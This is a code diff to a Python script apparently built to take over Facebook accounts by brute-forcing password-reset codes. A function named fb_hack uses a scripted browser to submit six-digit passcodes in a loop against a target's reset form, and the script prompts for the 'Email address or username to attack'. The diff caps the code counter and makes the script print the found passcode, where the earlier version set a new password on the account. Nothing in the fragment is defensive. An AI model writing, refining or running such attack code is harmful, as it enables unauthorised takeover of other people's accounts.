@@ -140,7 +140,9 @@ def fb_hack(email, codex):
     print(check2)
     reset = int(codex)
   if check1 != test:
-    while check1 == check3:  
+    if reset > 999999:
+      reset = 999999
+    while check1 == check3:
       browser.select_form(nr=0)
       y = passcode6(reset)
       browser.form['n'] = y
@@ -180,14 +182,15 @@ def fb_hack(email, codex):
   else:
     response1 = browser.response()
     soup = BeautifulSoup(response1, 'html.parser')
-    print(soup.find(string="password_new"))
-    yes = input('Continue/Exit? ')
-    if yes == 'n':
-      exit()
+    if soup.find(string="password_new") == test:
+      print("Password not found")
+      sys.exit()
     else:
-      new = input('New Password: ')
-      browser.select_form(nr=0)
-      browser.form['password_new'] = new
+      print("Passcode found!")
+      print(y)
+      sys.exit()
+
+
 os.system('clear')
 ehack = input('Email address or username to attack:')
 reset = input('Code: ') or 99999999
